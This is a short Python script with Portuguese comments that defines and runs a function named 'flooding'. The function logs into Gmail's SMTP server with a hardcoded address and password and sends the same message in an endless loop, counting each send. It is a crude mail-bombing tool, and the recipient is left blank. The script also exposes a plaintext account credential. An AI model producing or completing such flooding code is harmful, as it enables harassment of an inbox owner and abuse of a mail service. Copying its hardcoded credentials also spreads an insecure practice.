def flooding():
    import smtplib
    x=0
    qtd=0
    while x ==0 and qtd >=0:
      qtd+=1
      # Credenciais
      remetente    = 'blafloading@gmail.com'
      senha        = '123fload.'
      
      # Informações da mensagem
      destinatario = ''
      assunto      = ''
      texto        = 'Esse email foi enviado usando python! :)'
      
      # Preparando a mensagem
      msg = '\r\n'.join([
        'From: blafloading@gmail.com %s' % remetente,
        'To:  %s' % destinatario,
        'Subject:Python %s' % assunto,
        '',
        '%s' % texto
        ])
      
      # Enviando o email
      server = smtplib.SMTP('smtp.gmail.com:587')
      server.starttls()
      server.login(remetente,senha)
      server.sendmail(remetente, destinatario, msg)
      server.quit()
      print(qtd,'E-mail enviado')
      
flooding()

